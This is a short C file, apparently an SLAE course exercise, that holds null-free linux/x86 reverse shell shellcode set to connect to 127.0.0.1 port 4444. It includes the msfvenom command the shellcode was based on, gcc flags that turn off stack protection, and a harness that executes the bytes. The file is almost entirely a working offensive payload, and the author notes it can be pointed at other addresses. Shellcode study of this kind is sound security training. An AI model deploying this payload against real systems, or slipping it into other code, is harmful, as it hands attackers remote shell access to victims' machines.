/*

Architecture	: x86
OS		: Linux
Author		: wetw0rk
ID		: SLAE-958
Shellcode Size	: 66 bytes
Reverse Host	: 127.0.0.1
Reverse Port	: 4444
Description	: A linux/x86 reverse shell. For testing purposes, went
		  ahead and made the reverse shell connect to 127.0.0.1
		  port 4444. Shellcode contains no nulls and is smaller
		  than msfvenom by 2 bytes ;).

Original Metasploit Shellcode:
	sudo msfvenom -p linux/x86/shell_reverse_tcp -b "\x00" LHOST=127.0.0.1 LPORT=4444
	-f c --smallest -i 0

Test Using:
	gcc -fno-stack-protector -z execstack tshell.c
*/

#include <stdio.h>
#include <string.h>

unsigned char code[]= \
/*
Here we can see my "word" trick making the shellcode 65 bytes
once again this trick only works with 127.0.0.1. Meaning that
a normal IP such as 192.168.136.129 will make the shellcode a
mere 66 bytes.
*/
"\x6a\x66\x58\x99\x53\x43\x53\x6a\x02\x89\xe1\xcd\x80\x93\x59"
"\xb0\x3f\xcd\x80\x49\x79\xf9\x66\x68\x7f\x10\x66\x68\x11\x5c"
"\x66\x6a\x02\x89\xe1\xb0\x66\x6a\x42\x51\x53\x89\xe1\xcd\x80"
"\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89"
"\xe1\xb0\x0b\xcd\x80";

int main()
{
	printf("Shellcode Length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}

